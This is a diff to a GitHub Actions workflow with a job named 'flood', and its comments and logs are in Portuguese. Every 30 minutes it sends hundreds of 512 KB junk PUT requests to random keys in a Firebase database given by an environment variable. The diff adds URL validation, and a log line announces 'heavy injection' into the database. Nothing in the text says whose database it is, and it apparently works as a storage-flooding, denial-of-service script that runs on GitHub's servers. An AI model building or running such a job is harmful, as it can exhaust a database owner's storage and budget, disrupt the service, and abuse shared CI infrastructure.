@@ -3,7 +3,7 @@ name: Giga Storage Engine
 on:
   workflow_dispatch:
   schedule:
-    - cron: '*/30 * * * *' # Roda automaticamente a cada 30 minutos
+    - cron: '*/30 * * * *'
 
 jobs:
   flood:
@@ -15,6 +15,15 @@ jobs:
       run: |
         node -e '
         const https = require("https");
+        
+        let rawUrl = process.env.DB_URL || "";
+        let cleanUrl = rawUrl.trim().replace(/\/$/, "");
+        
+        if (!cleanUrl.startsWith("https://")) {
+            console.error("ERRO: A URL da Firebase precisa começar com https://");
+            process.exit(1);
+        }
+
         const payload = JSON.stringify({ payload: "X".repeat(512 * 1024), time: Date.now() });
         
         async function sendBatch() {
@@ -22,7 +31,7 @@ jobs:
             for (let i = 0; i < 50; i++) {
                 let key = "cloud_" + Math.random().toString(36).substring(2, 9);
                 let p = new Promise((resolve) => {
-                    let req = https.request(`${process.env.DB_URL}/storage_stress/${key}.json`, {
+                    let req = https.request(`${cleanUrl}/storage_stress/${key}.json`, {
                         method: "PUT",
                         headers: { "Content-Type": "application/json" }
                     }, (res) => { resolve(); });
@@ -36,7 +45,7 @@ jobs:
         }
 
         async function run() {
-            console.log("Iniciando injeção pesada via servidores do GitHub...");
+            console.log("Iniciando injeção pesada na Firebase: " + cleanUrl);
             for (let j = 0; j < 10; j++) {
                 await sendBatch();
             }
